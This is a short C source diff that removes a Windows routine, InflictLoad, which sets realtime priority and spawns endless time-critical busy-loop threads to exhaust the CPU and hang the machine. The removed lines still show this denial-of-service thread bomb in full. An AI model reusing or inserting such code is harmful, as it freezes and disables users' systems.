@@ -40,20 +40,6 @@
 #define FOF_TURBO	1024
 
 
-DWORD WINAPI LoadThread(LPVOID param) {
-	while(1);
-	return 0;
-}
-
-void InflictLoad(void) {
-	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
-	while(1) {
-		DWORD dwTid;
-		HANDLE hThread=CreateThread(NULL, 0, LoadThread, NULL, 0, &dwTid);
-		SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
-	}
-}
-
 int Addnull(char *Input, int Size) {
 	int i = 0;
 	while((i < Size - 1) && Input[i++]);
